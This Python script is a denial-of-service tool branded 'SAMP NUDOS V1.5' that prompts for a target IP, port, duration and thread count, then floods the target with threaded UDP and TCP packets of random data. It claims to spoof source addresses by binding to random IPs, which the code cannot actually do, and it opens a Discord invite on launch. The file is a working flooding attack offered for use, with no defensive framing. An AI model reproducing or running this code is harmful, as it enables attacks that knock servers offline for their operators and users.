import random
import socket
import threading
import os
import time
from colorama import Fore, Style, init

# تهيئة Colorama
init()

# Function to get color codes
def get_color_code(color_name):
    color_codes = {
        'red': Fore.RED,
        'green': Fore.GREEN,
        'yellow': Fore.YELLOW,
        'blue': Fore.BLUE,
        'reset': Style.RESET_ALL
    }
    return color_codes.get(color_name.lower(), Fore.RESET)

# Function to print colored text
def print_colored_text(color_name, text):
    color_code = get_color_code(color_name)
    print(color_code + text + Style.RESET_ALL)

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

print("""
\u001b[35m
      AUTHOR TOOLS : SAMP NUDOS
    ╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
    ╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
    ╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
""")

ip = str(input(" Target IP : "))
port = int(input(" Target Port : "))
duration = int(input(" Duration (seconds): "))
threads = int(input(" Number of Threads: "))

def check_connection():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((ip, port))
            print(Fore.GREEN + "[*] Connection successfully" + Style.RESET_ALL)
            return True
    except Exception as e:
        print(Fore.RED + f"[!] Connection failed: {e}" + Style.RESET_ALL)
        return False

def generate_fake_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def udp_attack():
    data = random._urandom(4096)  # زيادة حجم البيانات إلى 4096 بايت
    addr = (ip, port)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            fake_ip = generate_fake_ip()
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.bind((fake_ip, 0))  # ربط السوكيت بعنوان IP وهمي
                s.sendto(data, addr)
                time.sleep(random.uniform(0.005, 0.02))  # فترات انتظار عشوائية بين الحزم
        except Exception as e:
            print(f"[!] UDP send error: {e}")

def tcp_attack():
    data = random._urandom(4096)  # زيادة حجم البيانات إلى 4096 بايت
    addr = (ip, port)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            fake_ip = generate_fake_ip()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((fake_ip, 0))  # ربط السوكيت بعنوان IP وهمي
                s.connect(addr)
                s.send(data)
                time.sleep(random.uniform(0.005, 0.02))  # فترات انتظار عشوائية بين الحزم
        except Exception as e:
            print(f"[!] TCP send error: {e}")

# التحقق من الاتصال بالخادم
if check_connection():
    # بدء الهجوم
    for _ in range(threads):
        th_udp = threading.Thread(target=udp_attack)
        th_tcp = threading.Thread(target=tcp_attack)
        th_udp.start()
        th_tcp.start()

    # رسالة نجاح الهجوم بعد بدء جميع الخيوط
    print(Fore.LIGHTGREEN_EX + "\n [!] Attack sent successfully\n" + Style.RESET_ALL)